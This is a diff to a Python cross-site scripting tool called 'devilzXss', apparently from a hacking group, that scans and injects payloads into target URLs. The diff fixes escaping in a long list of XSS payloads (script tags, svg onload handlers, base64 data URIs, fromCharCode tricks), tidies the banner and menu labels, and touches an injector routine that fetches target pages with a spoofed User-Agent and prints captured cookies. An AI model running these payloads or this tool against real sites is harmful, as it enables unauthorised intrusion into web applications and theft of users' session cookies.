@@ -96,22 +96,22 @@ xss_attack = ["%22%3Cscript%3Ealert%28%27dev%27%29%3C%2Fscript%3E"
                             "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
                             "<marquee/onstart=confirm(2)>",
                             "<A HREF=\"http://www.google.com./\">XSS</A>",
-                            "<svg/onload=prompt(1);>"
+                            "<svg/onload=prompt(1);>",
 							");xss:expression(alert(1));border-image:url(foobar",
 							"xss'+alert(1)+'",
 							"</textarea><script>alert(/xss/)</script>",
-							"<img src="javascript:alert('XSS')">",
+							"<img src=\"javascript:alert('XSS')">",
 							"><script alert(String.fromCharCode(88,83,83))</script>",
 							"'>><marquee><h1>XSS</h1></marquee>",
 							"alert(String.fromCharCode(88,83,83));'))">",
 							"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",
-							"<BODY ONLOAD=alert("XSS")>",
-							"<BODY BACKGROUND="javascript:alert('XSS')">",
+							"<BODY ONLOAD=alert(\"XSS\")>",
+							"<BODY BACKGROUND=\"javascript:alert('XSS')">",
 							"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",
 							"<%<!--'%><script>alert(1);</script -->",
 							"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",
 							"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;",
-							""><svg onload="prompt(/xss/)"></svg>"]
+							"\"><svg onload=\"prompt(/xss/)\"></svg>"]
 
 
 class MyOpener(FancyURLopener):
@@ -185,11 +185,11 @@ def xxs2(exploi):
 
 print("\t\033[1;31m	/--------------------------//	\033[1;m")
 print("\t\033[1;31m	|          devilzXss       ||	\033[1;m")
-print("\t\033[1;31m |     By devilzc0de team   ||	\033[1;m")
-print("\t\033[1;31m |                          ||	\033[1;m")
+print("\t\033[1;31m	|     By devilzc0de team   ||	\033[1;m")
+print("\t\033[1;31m	|                          ||	\033[1;m")
 print("\t\033[1;31m	|       Beta Version       |/ 	\033[1;m")
-print("\t\033[1;31m |      devilzc0de.org      /	\033[1;m")
-print("\t\033[1;31m '--------------------------' 	\033[1;m")
+print("\t\033[1;31m	|      devilzc0de.org      /	\033[1;m")
+print("\t\033[1;31m	'--------------------------' 	\033[1;m")
 
 
 print("\033[1;35m These types of URLs are accepted\033[1;m")
@@ -207,8 +207,8 @@ links = re.findall('"((http|href)s?://.*?)"', html)
 print((30 * '\033[1;31m-\033[1;m'))
 print ("Select an operation:")
 print((30 * '\033[1;31m-\033[1;m'))
-print (" 1. XSS Scanner")
-print (" 2. Payload Injector")
+print (" 1. scan xss")
+print (" 2. Injector")
 choice = input(' Enter your choice [1-2] : ')
 print(res.info())
 myfile = res.read()
@@ -283,7 +283,7 @@ if('2' in choice):
                 req = Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"})
                 f = opener.open(req)
                 html = f.read()
-                print ("Excute document.cookie")
+                print ("Execute document.cookie")
                 time.sleep (3)
                 for cookie in cj:
                     print ("\033[1;32m==>\033[1;m", cookie)
